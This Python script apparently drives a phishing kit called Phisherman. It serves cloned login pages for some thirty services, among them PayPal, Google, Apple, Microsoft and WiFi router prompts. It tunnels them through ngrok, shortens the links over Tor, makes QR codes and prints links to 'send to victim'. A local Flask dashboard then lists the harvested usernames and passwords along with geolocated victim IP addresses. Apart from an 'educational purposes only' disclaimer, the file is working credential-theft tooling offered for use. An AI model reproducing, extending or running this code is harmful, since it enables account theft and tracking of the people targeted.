#!/Library/Frameworks/Python.framework/Versions/3.8/bin/python3
import subprocess
from sys import exit
from typing import final
from src.termcolor import colored
import platform
from base64 import b64decode
from zipfile import ZipFile
from os import walk,path,getcwd,mkdir,remove,environ
import threading
from datetime import datetime
from src import requests
from src.torpy.http.requests import TorRequests
from src.flask import Flask, render_template, request
import logging
log = logging.getLogger('werkzeug')
log.disabled = True
environ['WERKZEUG_RUN_MAIN'] = 'true'

try:
    subprocess.check_output('php -v > /dev/null 2>&1',shell=True)
except:
    print(colored('[*] PLEASE INSTALL PHP BEFORE STARTING PHISHERMAN','red',attrs=['bold']))
    exit()

def get_my_ip():
    
    return requests.get('https://api.ipify.org/?format=json').content.decode('utf8').split(':')[-1][1:-2]

def shorten(url,vpn):    
    
    inter = vpn.post('http://lnkiy.com/createShortLink',data={"link":""+url}).content.decode('utf8')
    if '++' in inter:
        return inter.split('++')[0]
    else:
        print(inter)
        return '[*] Error generating random shortened URL'
    
def custom_short(url,c,vpn):
    
    inter = vpn.post('http://lnkiy.com/createCustomUrl',data={"linld":""+url,"slink":""+c}).content.decode('utf8')
    if '++' in inter:
        return inter.split('++')[0]
    else:
        return '[*] Error generating custom shortened URL'

def qrcode(url,server,vpn):
    
    if not path.isdir('qrcodes'):
        mkdir('qrcodes')
    if 'lnkiy' in url:
        c = vpn.get(url+'-qrcode',allow_redirects = True).content.decode('utf8').split('<img height="300px" width="300px" src="')[-1].split('"/>')[0]
        open('qrcodes/'+server+'-qr.png','wb').write(b64decode(c.split(',')[-1]))
        return 'qrcodes/'+server+'-qr.png'    
    else:
        open('qrcodes/'+server+'-qr.png','wb').write(requests.get('https://chart.apis.google.com/chart?cht=qr&chs=300x300&chl='+url+'&chld=H|0').content)
        return 'qrcodes/'+server+'-qr.png'   


def ngrok():
    try:
        subprocess.check_output('./ngrok -v > /dev/null 2>&1',shell=True)
        return
    except:
        pass
    if (1):
        print(colored('[*] Downloading ngrok','red',attrs=['bold']))
        if platform.system() == 'Darwin':
            r = requests.get('https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-darwin-amd64.zip',allow_redirects=True).content
            open('ngrok-zip.zip','wb').write(r)
        else:
            r = requests.get('https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip',allow_redirects=True).content
            open('ngrok-zip.zip','wb').write(r)
        with ZipFile('ngrok-zip.zip', 'r') as zip:
            zip.extractall()
    subprocess.Popen(['chmod','+x', 'ngrok'],stdin =subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE,universal_newlines=True)
    tkn = input(colored('[*] Please create an account on https://ngrok.com and enter your authtoken : ','green',attrs=['bold']))
    subprocess.Popen(['./ngrok','authtoken', tkn],stdin =subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE,universal_newlines=True)
    subprocess.Popen(['rm','-rf', 'ngrok-zip.zip'],stdin =subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE,universal_newlines=True)
    
            
get_link = lambda : "https:"+requests.get('http://127.0.0.1:4040/api/tunnels/command_line').content.decode('utf8').split(',')[2].split(':')[2].strip('"')
start_ngrok = lambda : subprocess.Popen(['./ngrok','http', '3030'],stdin =subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE,universal_newlines=True)    
def start_php(server):
    subprocess.Popen(['php','-S', '127.0.0.1:3030','-t','sites/'+server],stdin =subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE,universal_newlines=True)

def refresh():
    for root, dirs, files in walk(getcwd()+'/sites/'):
        for file in files:
            if file in ('ip.txt','redir.txt','victims.txt'):                        
                open(path.join(root, file),'w+')                        
    for root, dirs, files in walk(getcwd()+'/qrcodes/'):
        for file in files:
            if file.split('.')[-1].lower() == 'png':
                remove('qrcodes/'+file)

def attack(server,url,wifi,custom,qr):
            
    t1 = threading.Thread(target=start_ngrok)
    t2 = threading.Thread(target=start_php,args=[server])
    t1.setDaemon = True
    t2.setDaemon = True
    print()
    print(colored('[*] Starting php server....','green',attrs=['bold']))  
    t2.start()      
    print(colored('[*] Starting ngrok....','green',attrs=['bold']))    
    t1.start()        
    if '/' not in server:        
        open(getcwd()+'/sites/'+server+'/redir.txt','w+').write(url)
    elif wifi:
        open(getcwd()+'/sites/'+server+'/wifi.txt','w+').write(wifi)
    print(colored('[*] Initiating Tor....','green',attrs=['bold']))    
    my_ip = [get_my_ip().strip(' ').strip('\n')]
    with TorRequests() as tor_requests:
        with tor_requests.get_session() as sess:
            print(colored('[*] Generating links....','green',attrs=['bold']))    
            while 1:    
                try:
                    link = get_link()  
                    qrc = ''
                    shortened = ''
                    if custom:
                        shortened = custom_short(link,custom,sess)
                        if '://' not in shortened:
                            shortened += '\n'+shorten(link,sess)
                    else:
                        shortened = shorten(link,sess)
                    if qr:
                        if '://' in shortened:
                            ur = shortened if '\n' not in shortened else shortened.split('\n')[-1]
                            qrc = '[*] QR Code for '+ur+' saved at '+qrcode(ur,server,sess)
                        else:
                            qrc = '[*] QR Code for '+link+' saved at '+qrcode(link,server,sess)                    
                    break
                except Exception as e:
                    print(e)
                    return
            print()
            print(colored('[*] Send any of these links to victim  :  \n\n','green',attrs=['bold'])+colored(link+'\n'+shortened+'\n'+qrc,'red',attrs=['bold']))            
    return    

def visitors(server):
    
    final = ''
    v1 = '''<div class="row"><input type="radio" name="expand"><span class="cell primary" data-label="IP Address">'''
    v2 = '''</span><span class="cell" data-label="'''
    v3 = '">'
    v4 = "</span>"
    v5 = "</span></div>"
    r = open('sites/'+server+'/ip.txt').read().split('\n')
    f = ip_details(r)
    if not f:
        return ''
    for a in f:
        k = list(a.keys())
        v = list(a.values())
        final += v1+v[0]+v2
        for b in range(len(v)-1):
            final += k[b]+v3+v[b]+v4+v2
        final += v5
    return final                        

def victims(server):
    
    final = ''
    v1 = '''<div class="row"><input type="radio" name="expand"><span class="cell primary" data-label="Username">'''
    v2 = '''</span><span class="cell" data-label="Password">'''
    v3 = '</span></div>'
    for a in open('sites/'+server+'/victims.txt').read().split('\n'):
        if a:
            b = a.split('<!:!>')
            final += v1+b[0]+v2+b[1]+v3
    if not final:
        return ''
    return final

def ip_details(lisz):
    
    final = []
    lisz = lisz[:-1]
    for lis in range(len(lisz)):
        if lisz[lis][0] not in '0123456789':
            continue
        finale = {}
        ip = lisz[lis]
        headers = {
            "User-agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.80 Safari/537.36"
        }
        url = 'http://ip-api.com/json/'+ip.strip('\n')
        dic = requests.get(url,headers=headers).json()
        if 'AWS' in dic['org']:
            return 0
        finale['IP Address']=lisz[lis]
        finale['Language']=lisz[lis+1]
        finale['User Agent']=lisz[lis+2] 
        finale['Country']=dic['country']
        finale['Country Code']=dic['countryCode']
        finale['Region']=dic['regionName']
        finale['City']=dic['city']
        finale['Zip Code']=dic['zip']
        finale['ISP Latitude']=str(dic['lat'])
        finale['ISP Longitude']=str(dic['lon'])
        finale['Timezone']=dic['timezone']
        finale['ISP']=dic['isp']
        finale['ISP Organisation']=dic['org']
        finale['AS']=dic['as']
        final.append(finale) 
    return final
    

def main():    
    
    ngrok()
    s1 = colored('''

[*]  DISCLAIMER : DEVELOPERS ASSUME NO LIABILITY AND ARE NOT RESPONSIBLE FOR ANY MISUSE  [*]
                            
                              FOR EDUCATIONAL PURPOSES ONLY

    ''','red',attrs=['bold'])
    s2 = colored('''
             .
           '  \    O_____  _    _ _____  _____ _    _ ______ _____  __  __          _   _ 
         '     \@  |  __ \| |  | |_   _|/ ____| |  | |  ____|  __ \|  \/  |   /\   | \ | |
       '        `\/| |__) | |__| | | | | (___ | |__| | |__  | |__) | \  / |  /  \  |  \| |
     '           __|  ___/|  __  | | |  \___ \|  __  |  __| |  _  /| |\/| | / /\ \ | . ` |
   '           //| | |    | |  | |_| |_ ____) | |  | | |____| | \ \| |  | |/ ____ \| |\  |
 '            // | |_|    |_|  |_|_____|_____/|_|  |_|______|_|  \_\_|  |_/_/    \_\_| \_| v1.0
'~-~-~-~-~-~""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""" 

    ''','green',attrs=['bold'])
    s3 = colored('''
              

[1] ADOBE           [11] INSTAGRAM     [21] TWITCH           [31] FLICKR   
[2] AMAZON          [12] LINKEDIN      [22] TWITTER          [32] COINIMP
[3] APPLE ID        [13] MESSENGER     [23] WORDPRESS        [33] INSTAGRAM VERIFICATION
[4] WIFI            [14] MICROSOFT     [24] YAHOO            [q/Q] QUIT
[5] DROPBOX         [15] NETFLIX       [25] EBAY         
[6] FACEBOOK        [16] PAYPAL        [26] ORIGIN
[7] GITHUB          [17] PINTEREST     [27] CRYPTOCOIN
[8] GOOGLE          [18] PROTONMAIL    [28] STACKOVERFLOW    
[9] iCLOUD          [19] SNAPCHAT      [29] NGROK
[10] IGFOLLOWERS    [20] STEAM         [30] REDDIT

''','green',attrs=['bold'])
    print(s1+s2+s3,end='\n\n')
    server_list={
        1 : 'adobe',
        2 : 'amazon',
        3 : 'apple',
        4 : 'wifi',
        5 : 'dropbox',
        6 : 'facebook',
        7 : 'github',
        8 : 'google',
        9 : 'icloud',
        10 : 'igfollowers',
        11 : 'instagram',
        12 : 'linkedin',
        13 : 'messenger',
        14 : 'microsoft',
        15 : 'netflix',
        16 : 'paypal',
        17 : 'pinterest',
        18 : 'protonmail',
        19 : 'snapchat',
        20 : 'steam',
        21 : 'twitch',
        22 : 'twitter',
        23 : 'wordpress',
        24 : 'yahoo',
        25 : 'ebay',
        26 : 'origin',
        27 : 'cryptocoin',
        28 : 'stackoverflow',
        29 : 'ngrok',
        30 : 'reddit',
        31 : 'flickr',
        32 : 'coinimp',
        33 : 'instagram-verified'
    }
    links = {
        'apple' : 'https://www.apple.com/shop/bag',
        'igfollowers' : 'https://www.instafollowerspro.com/login/login-procc.php',
        'microsoft' : 'https://login.live.com/ppsecure/post.srf?wa=wsignin1.0&rpsnv=13&ct=1616477099&rver=7.0.6738.0&wp=MBI_SSL&wreply=https:%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-signin%3Fru%3Dhttps%253A%252F%252Faccount.microsoft.com%252F%253Frefp%253Dsignedout-index%2526refd%253Dwww.google.com&id=292666&lw=1&fl=easi2&uiflavor=web&mkt=EN-GB&lc=2057&contextid=34E1E35DF72CFEA1&bk=1616477114&uaid=d0aa0f5716da4260bfd055b0666a726e&pid=0',
        'protonmail' : 'https://mail.protonmail.com/inbox',
        'yahoo' : 'https://login.yahoo.com/account/challenge/password?done=https%3A%2F%2Fwww.yahoo.com%2F&amp;sessionIndex=QQ--&amp;acrumb=8JMZJQox&amp;display=login&amp;authMechanism=primary',
        'instagram' : 'https://www.instagram.com',
        'adobe' : 'https://www.adobe.com/',
        'amazon' : 'https://www.amazon.com',
        'dropbox' : 'https://www.dropbox.com/',
        'facebook' : 'https://www.facebook.com',
        'github' : 'https://www.github.com/',
        'google' : 'https://www.google.com/webhp?hl=en&sa=X&ved=0ahUKEwiur43wqM7vAhX0wTgGHdiYBf8QPAgI',
        'icloud' : 'https://www.icloud.com/',
        'linkedin' : 'https://www.linkedin.com/',
        'messenger' : 'https://www.messenger.com/',
        'netflix' : 'https://www.netflix.com/',
        'paypal' : 'https://www.paypal.com/',
        'pinterest' : 'https://www.pinterest.com/',
        'snapchat' : 'https://www.snapchat.com/',
        'steam' : 'https://store.steampowered.com/',
        'twitch' : 'https://www.twitch.tv/',
        'twitter' : 'https://twitter.com/?lang=en',
        'wordpress' : 'https://wordpress.com/me',
        'ebay' : 'https://www.ebay.com/',
        'origin' : 'https://www.origin.com/en-us/store',
        'cryptocoin' : 'https://www.cryptocoin.pro/',
        'stackoverflow' : 'https://stackoverflow.com/',
        'ngrok' : 'https://ngrok.com/',
        'reddit' : 'https://www.reddit.com/',
        'flickr' : 'https://www.flickr.com',
        'coinimp' : 'https://www.coinimp.com/dashboard',
    }
    while 1:        
        print(colored('[*] Select your choice : ','green',attrs=['bold']),end='')
        ch = input()
        if ch.upper() == 'Q':
            return            
        elif int(ch) in server_list:
            server = server_list[int(ch)]
            break
        else:
            print(colored('[*] Invalid choice','yellow',attrs=['bold']))    
    if server.upper() not in 'WIFI INSTAGRAM-VERIFIED':
        r = colored('[*] Enter the URL you want to redirect the victim to (default is homepage of '+server.upper()+') : ','green',attrs=['bold'])    
        print()
        redir_url = input(r)
        if not redir_url:
            redir_url = links[server]
        wifi_model = ''
    elif server.upper() == 'WIFI':
        sub_servers = {
            1 : 'firmware-upgrade',
            2 : 'starbucks-login',
            3 : 'modal-login'
        }
        print(colored('''
                      
[1] FIRMWARE UPGRADE
[2] STARBUCKS LOGIN TO GOOGLE
[3] LOGIN TO WIFI THROUGH MODAL
              
''','green',attrs=['bold']))
        wifi_model = redir_url = ''
        while 1:
            ch_sub = input(colored('[*] Select your choice ','green',attrs=['bold']))
            if ch_sub in '123':
                server += '/'+sub_servers[int(ch_sub)]
                break
            else:
                print(colored('[*] Invalid choice','yellow',attrs=['bold']))
        if ch_sub == '1':
            print()
            wifi_model = input(colored('[*] Enter the brand of the target router ','green',attrs=['bold'])).upper()
        elif ch_sub == '3':
            print()
            wifi_model1 = input(colored('[*] Enter the AP name of the target router ','green',attrs=['bold']))
            wifi_model2 = input(colored('[*] Enter the encryption type of the target router ','green',attrs=['bold']))
            wifi_model = wifi_model1.upper()+':'+wifi_model2.upper()        
    else:
        wifi_model = redir_url = ''
    print()
    custom = input(colored('[*] Enter a custom shortened URL name (leave empty to generate a random shortened URL) ','green',attrs=['bold']))
    print()
    qr = input(colored('[*] Do you want to generate a QR Code for the link (Y/N)? '))
    qr = 1 if qr.upper() == 'Y' else 0
    attack(server,redir_url,wifi_model,custom,qr)
    final = '''[*] Navigate to http://127.0.0.1:5000 from your browser to view accounts phished\n\n[*] Press ctrl+C to quit'''
    print(colored(final,'yellow',attrs=['bold']))
    return server

app = Flask(__name__)

class web_server:
    global server        
    refresh()
    server = main()       
    if not server:
        exit()
    @app.route('/',methods = ['GET'])
    def index():  
        return render_template('index.html')
            
    @app.route('/visitors')
    def index2():
        return render_template('visitors.html')+visitors(server)

    @app.route('/victims')
    def index3():
        return render_template('victims.html')+victims(server)
    
if __name__ == '__main__' and platform.system().upper() != 'WINDOWS':
    
    app.run()    
